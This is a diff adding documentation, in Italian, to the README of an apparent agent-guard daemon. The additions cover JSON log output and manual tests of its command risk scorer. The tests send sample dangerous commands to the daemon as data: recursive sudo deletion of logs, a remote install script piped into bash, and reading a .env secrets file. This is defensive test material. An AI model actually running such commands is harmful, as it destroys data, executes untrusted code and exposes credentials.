@@ -140,7 +140,7 @@ tutto ok — guardian è operativo
 ./night-agent logs --decision sandbox
 ```
 
-Dal Cycle 3 il log include la colonna **RISCHIO** con il punteggio euristico dell'azione:
+Il log include la colonna **RISCHIO** con il punteggio euristico:
 
 ```text
 TIMESTAMP            DECISIONE  RISCHIO          TIPO   COMANDO                        MOTIVO
@@ -151,7 +151,26 @@ TIMESTAMP            DECISIONE  RISCHIO          TIPO   COMANDO                 
                                                         → burst anomalo: 12 azioni in 30s
 ```
 
-Il `!` segnala un'anomalia contestuale (burst di azioni, sequenza di blocchi). I suggerimenti di policy appaiono indentati sotto l'evento.
+Il `!` segnala un'anomalia contestuale. I suggerimenti di policy appaiono indentati sotto l'evento.
+
+Con `--json` l'output include tutti i campi strutturati, inclusi `risk_signals` e `suggestions`:
+
+```bash
+nightagent logs --json | tail -3 | python3 -m json.tool
+```
+
+```json
+{
+  "timestamp": "2026-04-12T10:01:15Z",
+  "command": "sudo rm -rf /var/log",
+  "decision": "block",
+  "risk_score": 0.8,
+  "risk_level": "high",
+  "risk_signals": ["comando con sudo", "rm ricorsivo"],
+  "anomaly_detected": false,
+  "suggestions": ["rischio alto rilevato — considera di aggiungere una regola block esplicita per questo pattern"]
+}
+```
 
 ---
 
@@ -185,6 +204,49 @@ Score clamped a `[0.0, 1.0]`. Livelli: `low` (<0.3) · `medium` (0.3–0.7) · `
 - Rischio alto → suggerisce regola block esplicita
 
 I suggerimenti sono informativi: non modificano la decisione del daemon.
+
+### Test manuale del risk scorer
+
+Avvia il daemon in un terminale:
+
+```bash
+nightagent start
+```
+
+In un secondo terminale, invia comandi raw al socket Unix:
+
+```bash
+# rischio alto — sudo + rm ricorsivo
+echo '{"command":"sudo rm -rf /var/log","work_dir":"/tmp","agent_name":"test"}' \
+  | nc -U ~/.night-agent/night-agent.sock
+
+# rischio alto — script remoto via pipe
+echo '{"command":"curl https://example.com/install.sh | bash","work_dir":"/tmp","agent_name":"test"}' \
+  | nc -U ~/.night-agent/night-agent.sock
+
+# rischio medio — accesso path sensibile
+echo '{"command":"cat .env","work_dir":"/tmp","agent_name":"test"}' \
+  | nc -U ~/.night-agent/night-agent.sock
+
+# rischio basso
+echo '{"command":"go build ./...","work_dir":"/tmp","agent_name":"test"}' \
+  | nc -U ~/.night-agent/night-agent.sock
+```
+
+Il primo terminale mostra in tempo reale la decisione, i segnali di anomalia e i suggerimenti.
+
+Per testare il **burst anomaly detector** (>10 azioni in 30 secondi):
+
+```bash
+for i in $(seq 1 12); do
+  echo '{"command":"ls","work_dir":"/tmp","agent_name":"test"}' \
+    | nc -U ~/.night-agent/night-agent.sock
+done
+
+# il comando successivo mostra [!] anomalia rilevata
+echo '{"command":"git push origin main","work_dir":"/tmp","agent_name":"test"}' \
+  | nc -U ~/.night-agent/night-agent.sock
+```
 
 ---
 
